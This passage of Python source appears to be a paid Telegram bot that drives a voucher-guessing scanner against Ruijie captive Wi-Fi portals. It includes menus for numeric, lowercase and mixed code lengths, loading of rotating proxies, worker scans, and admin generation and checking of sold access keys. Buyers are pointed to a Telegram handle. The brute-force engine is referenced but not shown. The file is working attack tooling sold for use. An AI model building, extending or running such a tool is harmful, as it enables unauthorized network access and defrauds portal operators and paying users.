            await live_dashboard_updater_final(context, user_id, state)
        except Exception:
            pass
        state["running"] = False

def get_main_menu_markup():
    keyboard = [
        [InlineKeyboardButton("🔗  PORTAL   🔮", callback_data="btn_update_portal"),
         InlineKeyboardButton("⚙️  MODES  📜", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("⚡  SCAN  ⚡", callback_data="btn_start_scanner"),
         InlineKeyboardButton("🛑  BANISH SCAN  🛑", callback_data="stop_scan")],
        [InlineKeyboardButton("👁️  ABYSS STATUS  👁", callback_data="btn_proxy_status"),
         InlineKeyboardButton("🧹  PURGE PROXIES  🧹", callback_data="btn_clear_proxies")],
        [InlineKeyboardButton("⛓️  ADD PROXIES  🕷️", callback_data="btn_add_proxies"),
         InlineKeyboardButton("🔑   ACCESS  🔑", callback_data="btn_my_key")],
        [InlineKeyboardButton("⚔️ ⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸  ⚔", callback_data="btn_back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_mode_menu_markup():
    keyboard = [
        [InlineKeyboardButton("💠 06 DIGIT  ⚡", callback_data="set_mode_num6"),
         InlineKeyboardButton("💠  07 DIGIT  ⚡", callback_data="set_mode_num7")],
        [InlineKeyboardButton("💠  08 DIGIT  ⚡", callback_data="set_mode_num8"),
         InlineKeyboardButton("💠  09 DIGIT  ⚡", callback_data="set_mode_num9")],
        [InlineKeyboardButton("❄️ 06 LOWER  💠", callback_data="set_mode_eng6"),
         InlineKeyboardButton("❄️  07 LOWER  💠", callback_data="set_mode_eng7")],
        [InlineKeyboardButton("❄️  08 LOWER  💠", callback_data="set_mode_eng8"),
         InlineKeyboardButton("🆎  06 ALPHA  💎", callback_data="set_mode_abc6")],
        [InlineKeyboardButton("Ⓜ️  06 MIXED  🧬", callback_data="set_mode_mix6"),
         InlineKeyboardButton("Ⓜ️  07 MIXED  🧬", callback_data="set_mode_mix7")],
        [InlineKeyboardButton("Ⓜ️  08 MIXED  🧬", callback_data="set_mode_mix8"),
         InlineKeyboardButton("📝  CUSTOM SPELL  ✦", callback_data="set_mode_custom")],
        [InlineKeyboardButton("🔁  RETURN  🦇", callback_data="btn_back_main")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_markup(callback="btn_back_main"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🦇  RETURN  🦇", callback_data=callback)]
    ])

def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user = update.effective_user
        if not user or user.id not in ADMIN_IDS:
            await update.effective_message.reply_text(
                "⛔ Access Denied! Mortal souls cannot invoke this command. "
                "Contact Overlord Telegram @mzw199761")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update, context, *args, **kwargs):
    user_id = update.effective_user.id

    if not is_user_authorized(user_id):
        context.user_data["waiting_for_paid_key"] = True
        await update.message.reply_text(
            "🔑 ** Seal Required**\n\n"
            "You require a  Seal Access Key to enter the realm.\n\n"
            "📌 Acquire key from  Lord — Telegram: @mzw199761\n\n"
            "🔮 Send your Access Key below:",
            parse_mode=ParseMode.MARKDOWN)
        return

    mode = context.user_data.get("selected_mode", "num6")
    saved_url = get_user_data(user_id)
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad

    if is_admin(user_id):
        key_line = "👑 Overlord Access (Infinite)"
    else:
        user_info = paid_users.get(user_id)
        if user_info:
            key_line = f"🔑  Seal Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
        else:
            key_line = "🔑  Realm Initiate"

    if saved_url:
        text = ("⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
                f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
                f"🕷️ Active Proxies: `{active}`\n"
                f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
                f"{key_line}\n"
                "🔮 Portal: Binding Established ✅")
    else:
        text = ("⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦  CONTROL ✦`\n\n"
                f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
                f"🕷️ Active Proxies: `{active}`\n"
                f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
                f"{key_line}\n"
                "❌ Portal missing. Press `PORTAL REALM` button to set.")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=get_main_menu_markup())

@admin_only
async def genkey_command(update, context, *args, **kwargs):
    await update.message.reply_text(
        "👑 **Thank You For Use**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send format in this order:\n\n"
        "```\n"
        "<time> <plan> <count> [prefix]\n"
        "```\n\n"
        "**Time Format:**\n"
        "• `1h` = 1 Hour\n"
        "• `6h` = 6 Hours\n"
        "• `12h` = 12 Hours\n"
        "• `24h` = 24 Hours\n"
        "• `1d` = 1 Day\n"
        "• `7d` = 7 Days\n"
        "• `30d` = 30 Days\n"
        "• `365d` = 365 Days\n"
        "• `30m` = 30 Minutes\n\n"
        "**Example:** `1h premium 5` or `30d vip 3`\n\n"
        "📌 Default: `1d premium 1 NAING`\n\n"
        "**Cancel Command:** /cancel",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ ABORT RITUAL • ↩️", callback_data="btn_back_main")]
        ]))
    context.user_data["waiting_for_genkey"] = True

@admin_only
async def cancel_command(update, context, *args, **kwargs):
    context.user_data["waiting_for_genkey"] = False
    await update.message.reply_text(
        "❌ **Ritual Aborted**",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())

@admin_only
async def reloadkeys_command(update, context, *args, **kwargs):
    try:
        keys = load_paid_keys_local()
        await update.message.reply_text(
            f"✅ ** Seals Reloaded**\n\n"
            f"📊 Total seals: `{len(keys)}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

def generate_keys_batch_seconds(duration_seconds, plan, count, prefix):
    import hashlib as _hl
    import datetime as _dt
    import random as _rnd
    import string as _st

    user_keys = []
    lines = []
    for _ in range(count):
        chars = _st.ascii_uppercase + _st.digits
        random_part = "".join(_rnd.SystemRandom().choice(chars) for _ in range(12))
        user_key = f"{prefix}-{random_part}"
        key_hash = _hl.sha256(user_key.encode()).hexdigest()[:32]
        expiry_date = _dt.datetime.now() + _dt.timedelta(seconds=duration_seconds)
        expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
        signature = _hl.sha256(f"{key_hash}:{expiry_str}".encode()).hexdigest()
        line = f"{key_hash}:{expiry_str}:{plan}:{signature}"
        user_keys.append(user_key)
        lines.append(line)
    return user_keys, lines

async def handle_genkey_input(update, context):
    user_id = update.effective_user.id
    raw = (update.message.text or "").strip()
    context.user_data["waiting_for_genkey"] = False

    parts = raw.split()
    if not parts:
        await update.message.reply_text("❌ Invalid Format. Send /genkey again.")
        return

    time_str = parts[0].lower()
    duration_seconds = None
    duration_text = ""

    try:
        if time_str.endswith("h"):
            hours = int(time_str[:-1])
            if hours < 1 or hours > 8760:
                raise ValueError
            duration_seconds = hours * 3600
            duration_text = f"{hours} hour(s)"
        elif time_str.endswith("d"):
            days = int(time_str[:-1])
            if days < 1 or days > 365:
                raise ValueError
            duration_seconds = days * 86400
            duration_text = f"{days} day(s)"
        elif time_str.endswith("m"):
            minutes = int(time_str[:-1])
            if minutes < 1 or minutes > 100000:
                raise ValueError
            duration_seconds = minutes * 60
            duration_text = f"{minutes} minute(s)"
        else:
            days = int(time_str)
            if days < 1 or days > 365:
                raise ValueError
            duration_seconds = days * 86400
            duration_text = f"{days} day(s)"
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid time format.\n"
            "**Example:** `1h premium 5` or `30d vip 3`",
            parse_mode=ParseMode.MARKDOWN)
        return

    try:
        plan = parts[1] if len(parts) > 1 else "premium"
        count = int(parts[2]) if len(parts) > 2 else 1
        prefix = parts[3] if len(parts) > 3 else "VOKA"
    except ValueError:
        await update.message.reply_text("❌ Invalid format numbers.")
        return

    if count < 1 or count > 100:
        await update.message.reply_text("❌ Count must be between 1 and 100.")
        return

    status = await update.message.reply_text(
        f"⏳ **Forging {count}  Seals...**\n\n"
        f"⏰ Duration: `{duration_text}`\n"
        f"📦 Plan: `{plan}`\n"
        f"🔤 Prefix: `{prefix}`",
        parse_mode=ParseMode.MARKDOWN)

    try:
        user_keys, lines = generate_keys_batch_seconds(duration_seconds, plan, count, prefix)
    except Exception as e:
        await status.edit_text(f"❌ Error: {e}")
        return

    try:
        if not os.path.exists(PAID_KEYS_FILE):
            with open(PAID_KEYS_FILE, "w") as f:
                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
        with open(PAID_KEYS_FILE, "a") as f:
            for line in lines:
                f.write(line + "\n")
        saved = True
    except Exception:
        saved = False

    expiry_date = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
    expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
    keys_text = "\n".join(f"`{k}`" for k in user_keys)

    msg = (
        f"✅ **{count}  SEAL(S) FORGED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ Duration: `{duration_text}`\n"
        f"📦 Plan: `{plan}`\n"
        f"⏳ Expiration: `{expiry_str}`\n"
        f"🔤 Prefix: `{prefix}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ACCESS KEYS:**\n\n{keys_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    if saved:
        msg += f"✅ Binding saved to `{PAID_KEYS_FILE}`\n"
        msg += "🔄 Restart bot or invoke `/reloadkeys`\n"
    else:
        msg += "⚠️ Save Failed!\n"

    try:
        await status.edit_text(
            msg, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ FORGE MORE ➕", callback_data="btn_genkey_more"),
                 InlineKeyboardButton("‹ RETURN ›", callback_data="btn_back_main")]
            ]))
    except Exception:
        pass

async def handle_callbacks(update, context, *args, **kwargs):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    await query.answer()

    if not is_user_authorized(user_id) and data != "btn_my_key":
        await query.edit_message_text(
            "🔑 ** Seal Required**\n\n"
            "Acquire access key from Overlord — Telegram: @mzw199761\n\n"
            "🔮 Send your Access Key in `/start`.",
            parse_mode=ParseMode.MARKDOWN)
        return

    mode = context.user_data.get("selected_mode", "num6")
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad

    if data == "btn_back_main":
        context.user_data["waiting_for_proxy_text"] = False
        context.user_data["waiting_for_portal_url"] = False
        context.user_data["waiting_for_digit"] = False
        context.user_data["waiting_for_genkey"] = False
        saved_url = get_user_data(user_id)
        if is_admin(user_id):
            key_line = "👑  Overlord Access (Infinite)"
        else:
            user_info = paid_users.get(user_id)
            if user_info:
                key_line = f"🔑  Seal Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
            else:
                key_line = "🔑  Realm Initiate"
        portal_line = "🔮 Portal: Binding Established ✅" if saved_url else \
            "❌ Portal missing. Press `PORTAL REALM` button."
        await query.edit_message_text(
            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
            f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
            f"🕷️ Active Proxies: `{active}`\n"
            f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
            f"{key_line}\n{portal_line}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if data == "btn_back_mode":
        context.user_data["waiting_for_digit"] = False
        await query.edit_message_text(
            "📜 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SELECT SPELL MODE**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_mode_menu_markup())
        return

    if data == "btn_genkey_more":
        context.user_data["waiting_for_genkey"] = True
        await query.edit_message_text(
            "👑 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SEAL CREATION**\n\n"
            "Format: `<time> <plan> <count> [prefix]`\n\n"
            "**Example:** `1h premium 5`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ ABORT RITUAL • ↩️", callback_data="btn_back_main")]
            ]))
        return

    if data.startswith("set_mode_"):
        new_mode = data[len("set_mode_"):]
        context.user_data["selected_mode"] = new_mode
        mode = new_mode
        if new_mode == "custom":
            context.user_data["waiting_for_digit"] = True
            await query.edit_message_text(
                "🔮 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • CUSTOM SPELL**\n\n"
                "Send starting digit sequence (0-9):",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_back_markup("btn_back_mode"))
            return
        await query.edit_message_text(
            f"✅  Spell Mode Inscribed!\n\n"
            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦  CONTROL ✦`\n\n"
            f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
            f"🕷️ Active Proxies: `{active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if data == "btn_update_portal":
        context.user_data["waiting_for_portal_url"] = True
        await query.edit_message_text(
            "🔮 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • PORTAL LINK**\n\n"
            "Send  Portal URL.\n"
            "Example:\n"
            "`https://portal-as.ruijienetworks.com/...?mac=xxxx&...`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_mode_menu":
        await query.edit_message_text(
            "📜 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SELECT SPELL MODE**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_mode_menu_markup())
        return

    if data == "btn_add_proxies":
        context.user_data["waiting_for_proxy_text"] = True
        await query.edit_message_text(
            "🕷 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • PROXY **\n\n"
            "Format:\n"
            "```\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080\n"
            "```\n"
            f"👁️ Currently Active: `{active}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_proxy_status":
        pm = get_proxy_manager()
        total, bad = pm.stats()
        active = total - bad
        sample = pm.proxies[:5] if pm.proxies else []
        sample_str = "\n".join(f"• `{p}`" for p in sample) if sample else "_(none)_"
        text = (
            "👁️ **Abyss Proxy Status**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Active Thralls: `{active}`\n"
            f"❌ Banished Bad: `{bad}`\n"
            f"📦 Total Bound: `{total}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Sample Thralls (5):**\n{sample_str}"
        )
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_clear_proxies":
        pm = get_proxy_manager()
        try:
            with open(PROXY_FILE, "w") as f:
                f.write("")
            pm.proxies = []
            pm.bad_proxies = []
            pm.fail_counts = {}
        except OSError:
            pass
        await query.edit_message_text(
            "🧹 **All proxies banished to the void!**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_start_scanner":
        await query.edit_message_text("⚡ ⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ Scanner...")
        asyncio.get_event_loop().create_task(run_user_scanner(context, user_id))
        return

    if data == "stop_scan":
        state = user_scanners.get(user_id)
        if state and not state["stop_event"].is_set():
            state["stop_event"].set()
            await query.edit_message_text(
                "🛑  Ritual Terminated!",
                reply_markup=get_back_markup("btn_back_main"))
        else:
            await query.edit_message_text(
                "ℹ️ No active ritual currently running.",
                reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_my_key":
        if is_admin(user_id):
            text = "👑 ** Overlord Access**\n\n🔓 Eternal Authority\n🔑 Key Not Required"
        else:
            user_info = paid_users.get(user_id)
            if user_info:
                text = (
                    "🔑 **Your  Seal Pact**\n\n"
                    f"📦 Plan: `{user_info['plan']}`\n"
                    f"📅 Expiration: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`\n"
                    f"🔐 Seal Code: `{user_info['key'][:8]}...{user_info['key'][-4:]}`"
                )
            else:
                text = "❌ **No Active  Seal Found**\n\nAcquire pact — Telegram: @mzw199761"
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

async def handle_text(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    raw_text = (update.message.text or "").strip()
    pm = get_proxy_manager()
    mode = context.user_data.get("selected_mode", "num6")

    if context.user_data.get("waiting_for_paid_key"):
        context.user_data["waiting_for_paid_key"] = False
        if is_admin(user_id):
            await update.message.reply_text(
                "👑 ** Overlord Access Granted**\n\n⚡ Control Panel Awakened ⚡",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_main_menu_markup())
            return
        result = validate_paid_key(raw_text)
        if result is None:
            await update.message.reply_text(
                "❌ **Invalid  Seal Key**\n\nAcquire pact — Telegram: @mzw199761",
                parse_mode=ParseMode.MARKDOWN)
            return
        if not result["valid"]:
            await update.message.reply_text(
                f"⏰ ** Seal Has Expired**\nExpired: `{result['expiry'].strftime('%Y-%m-%d %H:%M')}`",
                parse_mode=ParseMode.MARKDOWN)
            return
        register_paid_user(user_id, raw_text, result["expiry"], result["plan"])
        await update.message.reply_text(
            f"✅ ** Seal Verified!**\n\n"
            f"📦 Plan: `{result['plan']}`\n"
            f"📅 Expiration: `{result['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if context.user_data.get("waiting_for_genkey"):
        if not is_admin(user_id):
            context.user_data["waiting_for_genkey"] = False
            await update.message.reply_text("⛔ Admin Command Only", reply_markup=get_main_menu_markup())
            return
        await handle_genkey_input(update, context)
        return

    if not is_user_authorized(user_id):
        context.user_data["waiting_for_paid_key"] = True
        await update.message.reply_text(
            "🔑 **Seal Key Required**\n\n"
            "Acquire pact — Telegram: @mzw199761\n\n"
            "🔮 Send your Access Key:",
            parse_mode=ParseMode.MARKDOWN)
        return

    if context.user_data.get("waiting_for_proxy_text"):
        context.user_data["waiting_for_proxy_text"] = False
        lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text(
                "❌ Empty proxy list provided",
                reply_markup=get_back_markup("btn_back_main"))
            return
        added, invalid = pm.add_proxies(lines)
        total, bad = pm.stats()
        active = total - bad
        msg = (
            "✅ **Proxies Bound **\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➕ Added Thralls: `{added}`\n"
            f"❌ Banished Invalid: `{invalid}`\n"
            f"✅ Active Total: `{active}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN,
                                        reply_markup=get_main_menu_markup())
        return

    if context.user_data.get("waiting_for_portal_url"):
        context.user_data["waiting_for_portal_url"] = False
        if not raw_text.lower().startswith(("http://", "https://")):
            await update.message.reply_text(
                "❌ Invalid URL — must start with http:// or https://",
                reply_markup=get_back_markup("btn_back_main"))
            return
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(raw_text)
        except OSError:
            pass
        total, bad = pm.stats()
        await update.message.reply_text(
            "✅ **Portal  Saved**\n\n"
            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n"
            f"📜 Spell Mode: `{MODES.get(mode, mode)}`\n"
            f"🕷️ Active Proxies: `{total - bad}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if context.user_data.get("waiting_for_digit"):
        context.user_data["waiting_for_digit"] = False
        if not raw_text.isdigit():
            await update.message.reply_text(
                "❌ Send numerical digits only",
                reply_markup=get_back_markup("btn_back_mode"))
            return
        context.user_data["start_digit"] = int(raw_text[0])
        total, bad = pm.stats()
        await update.message.reply_text(
            f"✅ Start Digit Inscribed = `{raw_text[0]}`\n\n"
            f"📜 Mode: `{MODES.get(mode, mode)}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    saved_url = get_user_data(user_id)
    total, bad = pm.stats()
    if is_admin(user_id):
        key_line = "👑  Overlord Access"
    else:
        user_info = paid_users.get(user_id)
        if user_info:
            key_line = f"🔑 Pact Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
        else:
            key_line = "🔑  Realm Initiate"
    portal_line = "🔮 Portal: Binding Established ✅" if saved_url else "❌ Portal missing — Set Portal"
    await update.message.reply_text(
        "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
        f"📜 Spell Mode: `{MODES.get(mode, mode)}`\n"
        f"🕷️ Active Proxies: `{total - bad}`\n"
        f"🧑‍🔧 Workers: `{NUM_WORKERS}`\n"
        f"{key_line}\n{portal_line}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())

def main():
    ensure_files_exist()
    load_registered_users()
    
    if not BOT_TOKEN:
        print(bred + "[!] BOT_TOKEN Missing! Set BOT_TOKEN in Replit Secrets." + reset)
        sys.exit(1)

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("reloadkeys", reloadkeys_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    print(bgreen + f"[MAIN] Proxy Manager: {active} active / {total} total" + reset)
    print(bgreen + f"[MAIN] Paid users: {len(paid_users)}" + reset)
    print(bgreen + f"[MAIN] Admin IDs: {ADMIN_IDS}" + reset)
    print(bgreen + f"[MAIN] ⚡ NUM_WORKERS: {NUM_WORKERS}" + reset)

    print("⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ Bot is running...")
    app.run_polling(drop_pending_updates=True)

show_banner()
check_approval()
check_time_integrity()
_proxy_manager = get_proxy_manager()

if __name__ == "__main__":
    main()
